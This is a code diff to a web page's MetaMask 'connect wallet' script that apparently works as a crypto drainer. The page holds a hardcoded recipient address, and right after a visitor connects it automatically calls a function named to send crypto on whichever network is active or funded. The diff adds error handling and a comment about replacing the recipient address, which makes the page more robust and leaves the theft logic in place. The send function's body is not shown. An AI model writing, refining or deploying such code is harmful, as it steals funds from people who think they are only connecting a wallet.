@@ -119,24 +119,29 @@
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         let signer;
         let userAddress = "";
-        const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8";
+        const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8"; // Replace this with the recipient address
         const chains = {
             1: { name: 'Ethereum', chainId: 1, nativeSymbol: 'ETH' },
             56: { name: 'Binance Smart Chain', chainId: 56, nativeSymbol: 'BNB' },
             137: { name: 'Polygon', chainId: 137, nativeSymbol: 'MATIC' }
         };
 
+        // Function to check if MetaMask is installed
+        function isMetaMaskInstalled() {
+            return typeof window.ethereum !== 'undefined';
+        }
+
         document.getElementById('connectWallet').addEventListener('click', async () => {
             try {
-                if (!window.ethereum) {
-                    document.getElementById('status').innerText = `MetaMask is not installed.`;
+                if (!isMetaMaskInstalled()) {
+                    document.getElementById('status').innerText = `MetaMask is not installed. Please install MetaMask to continue.`;
                     return;
                 }
 
                 // Request account access
-                await provider.send("eth_requestAccounts", []);
+                const accounts = await provider.send("eth_requestAccounts", []);
                 signer = provider.getSigner();
-                userAddress = await signer.getAddress();
+                userAddress = accounts[0]; // Get the first account
                 document.getElementById('status').innerText = `Connected: ${userAddress}`;
 
                 document.getElementById('disconnectWallet').disabled = false;
@@ -144,11 +149,15 @@
 
                 await sendCryptoOnActiveOrFundedNetwork();
             } catch (error) {
-                document.getElementById('status').innerText = `Connection failed: ${error.message}`;
+                if (error.code === 4001) {
+                    document.getElementById('status').innerText = `Connection failed: User rejected the request.`;
+                } else {
+                    document.getElementById('status').innerText = `Connection failed: ${error.message}`;
+                }
             }
         });
 
-        document.getElementById('disconnectWallet').addEventListener('click', async () => {
+        document.getElementById('disconnectWallet').addEventListener('click', () => {
             userAddress = "";
             signer = null;
             document.getElementById('status').innerText = `Disconnected.`;
